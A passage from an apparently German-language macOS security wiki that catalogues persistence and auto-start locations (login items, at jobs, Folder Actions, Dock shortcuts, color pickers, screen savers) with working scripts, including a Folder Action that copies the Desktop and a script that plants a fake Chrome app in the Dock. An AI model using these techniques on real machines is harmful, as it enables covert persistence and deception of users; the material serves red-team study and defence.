> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Ausnutzung

Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **per SSH anmeldet**, sofern in `/etc/ssh/sshd_config` nicht `PermitUserRC no` festgelegt ist.<sup>[[14]](#references)</sup>

### **Anmeldeobjekte**

Bericht: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Aber du musst `osascript` mit Argumenten ausführen
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **Registrierte Anmeldeobjekt-Hilfs-App:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (üblicher Speicherort innerhalb des Bundles).
  - **Auslöser:** Bei der Registrierung wird die Hilfs-App möglicherweise sofort gestartet; bei späteren Benutzeranmeldungen wird sie erneut gestartet, sofern sie genehmigt wurde.
- **Registrierter gebündelter Agent/Daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` oder `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Auslöser:** Ein genehmigter Agent kann bei der Registrierung und bei späteren Anmeldungen gestartet werden; ein genehmigter Daemon startet beim Systemstart. Für einen Daemon ist eine Administratorgenehmigung erforderlich.

#### Beschreibung

Unter **Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen** können Benutzer Anmelde- und Hintergrundobjekte überprüfen. macOS 13 und spätere Versionen bieten [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice), um gebündelte Anmeldeobjekte, Launch-Agents und Launch-Daemons zu registrieren. Das Verhalten von [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) unterscheidet sich je nach Typ und Genehmigungsstatus. **Eine Hilfs-App in ein App-Bundle zu schreiben, reicht nicht aus, um ein neues Anmeldeobjekt zu registrieren.** Umgekehrt kann die Änderung einer bereits registrierten, beschreibbaren Hilfsprogrammdatei deren nächsten Start beeinflussen, ohne dass eine erneute Registrierung erforderlich ist. Überprüfe zuvor den tatsächlichen Pfad und die Code-Signing-Prüfungen.

Im Folgenden findest du eine schreibgeschützte Möglichkeit, auf einem Mac nach gebündelten Hilfsprogrammen zu suchen. Dabei wird keines davon registriert oder gestartet:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bei einem gebündelten Launch-Plist sollte `BundleProgram` relativ zum Stammverzeichnis des App-Bundles aufgelöst werden (zum Beispiel `Contents/MacOS/Helper`), wie in Apples [Migrationsanleitung für Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) angegeben. Eine schreibgeschützte Bestandsaufnahme von `/Applications` auf dem Forschungs-Mac ergab 14 gebündelte Helper-Einträge und fünf `BundleProgram`-Deklarationen; alle fünf Ziele ließen sich auflösen, und zwei bestanden eine Prüfung auf Schreibbarkeit durch den Benutzer. Diese Prüfung belegt **nicht**, dass einer der beiden Helper registriert oder aktiviert ist, nach der Signaturprüfung ausführbar ist oder von einer Sandbox erreicht werden kann. `sfltool dumpbtm` listete auf diesem Mac 150 benannte Einträge auf; es dient der Inspektion und ist kein Test dafür, dass jeder Eintrag ausgeführt wird.

Ältere Login Items lassen sich auch über Apple Events verwalten. Sie können über die Befehlszeile aufgelistet, hinzugefügt und entfernt werden, wobei das Hinzufügen die dauerhafte Login-Konfiguration des Benutzers ändert und möglicherweise eine Automation-Genehmigung erfordert:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` ist ein Implementierungsdetail und kein unterstützter Ort, um eine Payload einfach durch das Schreiben einer Datei zu installieren. Die ältere API `SMLoginItemSetEnabled` wurde für neue Helfer durch `SMAppService` abgelöst; der frühere Pfad `/var/db/com.apple.xpc.launchd/loginitems.501.plist` auf dieser Seite war auf dem macOS-26.5.2-Testsystem nicht vorhanden. Verwenden Sie zur Beurteilung moderner Anmeldeobjekte die Registrierungs-API und den System-UI-Status, statt einen Datenbankpfad vorauszusetzen.

### ZIP als Anmeldeobjekt

(Siehe vorherigen Abschnitt zu Anmeldeobjekten; dies ist eine Erweiterung.)

Wenn Sie eine **ZIP**-Datei als **Anmeldeobjekt** speichern, öffnet **`Archive Utility`** sie. Wenn die ZIP-Datei beispielsweise in `~/Library` gespeichert ist und den Ordner **`LaunchAgents/file.plist`** mit einer Backdoor enthält, wird dieser Ordner erstellt (standardmäßig ist er nicht vorhanden) und die plist-Datei wird hinzugefügt. Wenn sich der Benutzer das nächste Mal anmeldet, wird die **in der plist angegebene Backdoor ausgeführt**.

Eine weitere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im HOME-Verzeichnis des Benutzers zu erstellen. Wenn der Ordner `LaunchAgents` bereits vorhanden ist, funktioniert diese Technik ebenfalls.

### At

Write-up: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Sie müssen jedoch **`at` ausführen**, und es muss **aktiviert** sein
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`at` muss ausgeführt** werden und **aktiviert** sein

#### **Beschreibung**

`at`-Tasks dienen der **Planung einmaliger Tasks**, die zu bestimmten Zeitpunkten ausgeführt werden sollen. Anders als Cron-Jobs werden `at`-Tasks nach ihrer Ausführung automatisch entfernt. Wichtig ist, dass diese Tasks Systemneustarts überstehen, was sie unter bestimmten Bedingungen zu potenziellen Sicherheitsrisiken macht.<sup>[[16]](#references)</sup>

Die mitgelieferte `com.apple.atrun.plist` enthält `Disabled = true`, aber launchd speichert wirksame Aktivierungs-/Deaktivierungsüberschreibungen separat. Auf dem macOS-26.5.2-Testsystem meldete `launchctl print-disabled system` `com.apple.atrun` trotz dieses mitgelieferten Schlüssels als **aktiviert**. Prüfen Sie den tatsächlich wirksamen Status, bevor Sie behaupten, dass `at`-Jobs ausgeführt werden:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Ein Administrator kann einen deaktivierten `atrun`-Dienst mit `launchctl` aktivieren; das folgende historische Beispiel ändert den Zustand eines Systemdienstes und wurde **nicht** auf dem Research-Mac ausgeführt:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dies wird in 1 Stunde eine Datei erstellen:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Prüfe die Job-Warteschlange mit `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Oben sehen wir zwei geplante Jobs. Mit `at -c JOBNUMBER` können wir die Details des Jobs ausgeben.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Wenn AT tasks nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Der Dateiname enthält die Queue, die Jobnummer und den Zeitpunkt, zu dem der Job ausgeführt werden soll. Sehen wir uns zum Beispiel `a0001a019bdcd2` an.

- `a` – dies ist die Queue
- `0001a` – Jobnummer in Hexadezimal, `0x1a = 26`
- `019bdcd2` – Zeitpunkt in Hexadezimal. Er gibt die seit der Epoch vergangenen Minuten an. `0x019bdcd2` entspricht `26991826` im Dezimalsystem. Multiplizieren wir diesen Wert mit 60, erhalten wir `1619509560`, was dem Zeitpunkt `GMT: Dienstag, 27. April 2021, 7:46:00` entspricht.

Wenn wir die Jobdatei ausgeben, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Kalender-Benachrichtigungen zum Öffnen von Dateien

- **Schreibziel:** Ein ausführbares App-Bundle oder eine andere Datei, die bereits in einer benutzerdefinierten Kalender-Benachrichtigung vom Typ **Open file** ausgewählt wurde. Zum Erstellen oder Bearbeiten der Benachrichtigung selbst ist Zugriff auf das betreffende Kalenderereignis über Calendar oder eine akzeptierte Kalenderdatenquelle erforderlich; das Schreiben einer beliebigen Datei erstellt keine Benachrichtigung.
- **Auslöser:** Der geplante Zeitpunkt der Benachrichtigung auf einem Mac, auf dem Calendar das Ereignis verarbeitet. Ein wiederkehrendes Ereignis kann die Aktion wiederholen. [Apples aktuelle Calendar-Anleitung](https://support.apple.com/guide/calendar/icl1012/mac) bestätigt die Benachrichtigungsoption **Custom → Open file** unter macOS 26.
- **Ausführungsidentität und Einschränkungen:** Calendar öffnet die ausgewählte Datei für den angemeldeten Benutzer mit der zugehörigen Anwendung. Beim Starten eines App-Bundles kann dessen Code als dieser Benutzer ausgeführt werden, vorbehaltlich Gatekeeper, Quarantäne und anderer macOS-Prüfungen. Eine einfache Skriptdatei wird möglicherweise nur in einem Editor geöffnet; ihre Dateiendung allein beweist keine Codeausführung.

Um einen möglichen Kandidaten sicher zu beurteilen, prüfe die Benachrichtigung des Ereignisses in Calendar und die Berechtigungen der ausgewählten Datei. Dieser Pfad wurde anhand von Apples Anleitung dokumentiert und **nicht** auf dem Forschungs-Mac ausgeführt, da ein Test einen aktiven Kalender verändern und auf ein Desktop-Ereignis warten würde. In einem Wegwerf-Konto kann eine App-Bundle-Datei, die nur einen Marker setzt, ausgewählt, eine Open file-Benachrichtigung für einen nahen Zeitpunkt eingerichtet, der Start bestätigt und anschließend das Ereignis samt App gelöscht werden.

### Shortcuts-Automationen unter macOS

- **Schreibziel:** Eine ausführbare Datei, auf die bereits eine Aktion eines Kurzbefehls verweist, oder ein vorhandener Kurzbefehl, den ein autorisierter Benutzer bearbeiten kann. Eine beliebige `.shortcut`-Datei oder ein Schreibzugriff auf eine undokumentierte Shortcuts-Datenbank ist keine unterstützte Methode zur Registrierung einer Automation.
- **Auslöser und Identität:** Ein zuvor konfiguriertes und aktiviertes Automationsereignis, etwa eine Tageszeit oder ein App-Ereignis, führt den Kurzbefehl für den angemeldeten Benutzer aus. [Apples aktuelle Mac-Anleitung zu Automationen](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) führt unterstützte Ereignisse auf, erklärt, wann eine Automation ohne Nachfrage ausgeführt werden kann, und beschreibt das Entfernen eines Auslösers. [Apples Datenschutzanleitung für Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) verlangt **Allow Running Scripts** für Skriptaktionen; einzelne Aktionen können dennoch Berechtigungen anfordern.

Dies ist ein bedingter Pfad vom Schreibzugriff zur Ausführung, **nur wenn die vorhandene Aktion ein beschreibbares Ziel lädt**. Das Erstellen einer neuen Automation über die Benutzeroberfläche ändert aktive Einstellungen und wurde auf dem Forschungs-Mac nicht versucht. In einem Wegwerf-Konto kann ein Benutzer einen Kurzbefehl mit einem Tageszeit-Auslöser konfigurieren, dessen Skript `/tmp/ht-shortcuts-marker` berührt, die nötigen Berechtigungen aktivieren, nach dem Ereignis den Marker bestätigen und anschließend die Automation, den Kurzbefehl und den Marker löschen.

### Automator-Aktionen und Quick Actions

- **Schreibziele:** `~/Library/Automator/*.action` (Benutzer) und `/Library/Automator/*.action` (Administrator) für Aktions-Bundles. Ein gespeicherter Quick-Action-Workflow befindet sich üblicherweise unter `~/Library/Services/*.workflow`; prüfe den tatsächlichen Workflow-Pfad, den der Benutzer ausgewählt hat. [Apples Referenz zum Automator-Framework](https://developer.apple.com/documentation/automator) führt die Verzeichnisse auf, in denen nach Aktionen gesucht wird.
- **Auslöser:** Automator lädt verfügbare Aktions-Bundles beim Start, aber die Aufgabe einer Aktion wird ausgeführt, wenn ein Workflow, der sie verwendet, gestartet wird. Eine Quick Action wird ausgeführt, wenn der Benutzer sie im Finder, unter Services oder in einem anderen eingeblendeten Menü auswählt. Ein Folder-Action-Workflow wird ausgeführt, wenn Elemente zu seinem **bereits zugewiesenen** Ordner hinzugefügt werden; ein Calendar-Alarm-Workflow wird zum Ereigniszeitpunkt ausgeführt. [Apples Workflow-Typen](https://support.apple.com/guide/automator/aut7cac58839/mac) unterscheiden diese Ereignisse. Das bloße Schreiben einer Aktion oder eines Workflows weist keinen Ordner zu und plant kein Kalenderereignis.
- **Ausführungsidentität und Einschränkungen:** Das Konto, unter dem der Workflow läuft; Automator oder die aufrufende App muss die Aktion laden können, und aktuelle Prüfungen für Code-Signierung oder Datenschutz müssen sie zulassen. Ein beschreibbares Aktions-Bundle, auf das ein aktiver Workflow bereits verweist, unterscheidet sich vom Installieren einer neuen Aktion und dem Warten auf deren Auswahl.

Die Benutzerverzeichnisse `Automator` und `Services` waren auf dem macOS-26.5.2-Test-Mac vorhanden; `/Library/Automator` fehlte. Es wurde kein aktiver Workflow erstellt, zugewiesen oder ausgeführt. Verwende ein Wegwerf-Konto und eine Aktion bzw. einen Workflow, der nur einen Marker setzt, um einen bestimmten Ladepfad zu bestätigen. Der separate Abschnitt [Folder Actions](#folder-actions) behandelt diese Ereignisquelle ausführlicher.

### Folder Actions

Bericht: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Bericht: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Du musst jedoch `osascript` mit Argumenten aufrufen können, um **`System Events`** zu kontaktieren und Folder Actions konfigurieren zu können.
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Es gibt grundlegende TCC-Berechtigungen wie Desktop, Documents und Downloads.

#### Speicherort

- **`/Library/Scripts/Folder Action Scripts`**
  - Root-Berechtigungen erforderlich
  - **Auslöser**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung & Ausnutzung

Folder Actions sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, etwa durch das Hinzufügen oder Entfernen von Elementen oder andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen lassen sich für verschiedene Aufgaben verwenden und auf unterschiedliche Weise auslösen, zum Beispiel über die Finder-Benutzeroberfläche oder Terminalbefehle.<sup>[[17]](#references)[[18]](#references)</sup>

Zum Einrichten von Folder Actions gibt es unter anderem folgende Möglichkeiten:

1. Einen Folder-Action-Workflow mit [Automator](https://support.apple.com/guide/automator/welcome/mac) erstellen und als Dienst installieren.
2. Ein Skript manuell über Folder Actions Setup im Kontextmenü eines Ordners zuweisen.
3. OSAScript verwenden, um Apple-Event-Nachrichten an `System Events.app` zu senden und programmatisch eine Folder Action einzurichten.
   - Diese Methode ist besonders nützlich, um die Aktion ins System einzubetten und so eine gewisse Persistenz zu erreichen.

Das folgende Skript zeigt ein Beispiel dafür, was von einer Folder Action ausgeführt werden kann:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Damit das obige Skript mit Folder Actions verwendet werden kann, kompiliere es mit:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nachdem das Skript kompiliert wurde, richten Sie Ordneraktionen ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert Ordneraktionen global und weist das zuvor kompilierte Skript dem Schreibtischordner zu.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Führe das Setup-Skript mit folgendem Befehl aus:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- So implementierst du diese Persistenz über die GUI:

Dies ist das Skript, das ausgeführt wird:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Öffnen Sie dann die App `Folder Actions Setup`, wählen Sie den **Ordner aus, den Sie überwachen möchten**, und wählen Sie in Ihrem Fall **`folder.scpt`** (in meinem Fall habe ich sie output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn Sie diesen Ordner jetzt mit **Finder** öffnen, wird Ihr Skript ausgeführt.

Diese Konfiguration wurde base64-kodiert in der **plist** unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** gespeichert.

Versuchen wir nun, diese Persistence ohne GUI-Zugriff einzurichten:

1. **Kopieren Sie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um eine Sicherungskopie zu erstellen:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entfernen Sie** die gerade eingerichteten Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Da wir jetzt eine leere Umgebung haben:

3. Kopieren Sie die Sicherungskopie: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffnen Sie die Folder Actions Setup.app, damit diese Konfiguration übernommen wird: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Das hat bei mir nicht funktioniert, aber so lauten die Anweisungen aus dem Writeup:(

### Dock-Kurzbefehle

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Sie müssen jedoch eine bösartige Anwendung im System installiert haben
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
  - **Auslöser**: Wenn der Benutzer im Dock auf die App klickt

#### Beschreibung & Ausnutzung

Alle Apps, die im Dock angezeigt werden, sind in der plist **`~/Library/Preferences/com.apple.dock.plist`** aufgeführt.<sup>[[19]](#references)</sup>

Es ist möglich, **eine App hinzuzufügen**, indem man einfach Folgendes ausführt:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Mit etwas **social engineering** könntest du beispielsweise Google Chrome im Dock imitieren und tatsächlich dein eigenes Skript ausführen:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Eingabemethoden

- **Schreibziel:** Ein codehaltiges Eingabemethoden-App-Bundle, installiert unter `~/Library/Input Methods/` (Benutzer) oder `/Library/Input Methods/` (Administrator). Dies unterscheidet sich von Apples Nur-Text-Tastaturzuordnungsdateien `.inputplugin`, die für sich genommen keine beliebige Code-Payload sind.
- **Auslöser:** Der Benutzer fügt die Eingabequelle unter **Systemeinstellungen → Tastatur → Texteingabe** hinzu/aktiviert sie und wählt sie anschließend aus oder verwendet sie. Ein Bundle, das lediglich in das Verzeichnis kopiert wurde, ist kein Beleg dafür, dass macOS es starten wird. [Apples aktuelle Anleitung zu Eingabequellen](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beschreibt das Aktivieren und Wechseln von Quellen; [Apples InputMethodKit-Dokumentation](https://developer.apple.com/documentation/inputmethodkit) behandelt codehaltige Eingabemethoden.
- **Ausführungsidentität und Voraussetzungen:** Die Methode wird für den angemeldeten Benutzer ausgeführt, vorbehaltlich der Registrierung der Eingabemethode, der Codesignierung und der aktuellen macOS-Sicherheitsprüfungen. Für vorhandene aktivierte Methoden mit einer beschreibbaren ausführbaren Datei sind eine separate Pfad- und Signaturprüfung erforderlich.

Apples [älterer Hinweis zu Eingabemethoden von Drittanbietern](https://developer.apple.com/library/archive/qa/qa1810/_index.html) warnte bereits davor, dass bestimmte Palettenmethoden durch bloßes Kopieren in diese Verzeichnisse nicht einmal unter „Eingabequellen“ erscheinen. Auf dem Recherche-Mac mit macOS 26.5.2 ist das Benutzerverzeichnis vorhanden, aber es wurde kein Bundle installiert oder aktiviert. Daher handelt es sich um einen dokumentierten bedingten Pfad und nicht um ein lokales Laufzeitergebnis.

### Farbwähler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Eine sehr spezifische Aktion muss erfolgen
  - Sie landen anschließend in einer anderen Sandbox
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/Library/ColorPickers`
  - Root-Rechte erforderlich
  - Auslöser: Farbwähler verwenden
- `~/Library/ColorPickers`
  - Auslöser: Farbwähler verwenden

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbwähler-Bundle** mit Ihrem Code (Sie könnten zum Beispiel [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)), fügen Sie einen Konstruktor hinzu (wie im Abschnitt [Bildschirmschoner](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle nach `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wenn der Farbwähler anschließend ausgelöst wird, sollte auch Ihr Bundle ausgeführt werden.

Dies setzt voraus, dass eine kompatible App das Systemfarbfeld öffnet und den installierten Farbwähler auswählt. [Apples Anleitung zum Farbfeld](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beschreibt die Speicherorte für ältere Bundles. Eine lokale Pfadprüfung fand den älteren Farbwähler-XPC-Dienst, aber auf dem Recherche-Mac war kein Farbwähler installiert oder geladen. Leiten Sie allein aus dem Pfad keine TCC-Umgehung ab.

Beachten Sie, dass für das Binärprogramm, das Ihre Bibliothek lädt, eine **sehr restriktive Sandbox** gilt: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: **Nein, da Sie Ihre eigene App ausführen müssen**
- TCC bypass: Abhängig von der sandbox und den Berechtigungen der aktivierten Extension; es ist kein allgemeiner bypass bekannt.

#### Speicherort

- Eine bestimmte App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**finden Sie hier**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` enthalten. Diese Extension wird in eine Anwendung eingebunden, die ausgeführt wird. Damit die Extension ihren Code ausführen kann, **muss sie außerdem** mit einem gültigen Apple-Entwicklerzertifikat **signiert** und **sandboxed** sein (wobei weniger strenge Ausnahmen hinzugefügt werden können). Zudem muss sie mit etwas wie dem Folgenden registriert werden:<sup>[[21]](#references)[[22]](#references)</sup>

Eine installierte Extension muss außerdem **aktiviert** und für einen relevanten Finder-Speicherort oder ein entsprechendes Objekt aufgerufen werden; das Schreiben eines beliebigen `.appex`-Bundles reicht nicht aus. [Apples Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stellt den Aktivierungsstatus bereit. Die folgenden `pluginkit`-Befehle veranschaulichen die explizite Registrierung und Aktivierung, nicht einen allein durch eine Datei ausgelösten Autostart. Dieser Ansatz wurde anhand der Dokumentation überprüft; auf dem Forschungs-Mac wurde keine neue Extension installiert oder aktiviert.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Bildschirmschoner

Write-up: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Write-up: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Allerdings landest du in einer gewöhnlichen Application-Sandbox
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/System/Library/Screen Savers`
  - Root-Rechte erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `/Library/Screen Savers`
  - Root-Rechte erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `~/Library/Screen Savers`
  - **Auslöser**: Bildschirmschoner auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage aus, um einen neuen **Bildschirmschoner** zu generieren. Füge dann deinen Code hinzu, zum Beispiel den folgenden Code, um Logs zu erzeugen.<sup>[[23]](#references)[[24]](#references)</sup>

Erstelle den Build und kopiere das Bundle `.saver` nach **`~/Library/Screen Savers`**. Öffne dann die Bildschirmschoner-GUI und klicke einfach darauf. Es sollten zahlreiche Logs erzeugt werden:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
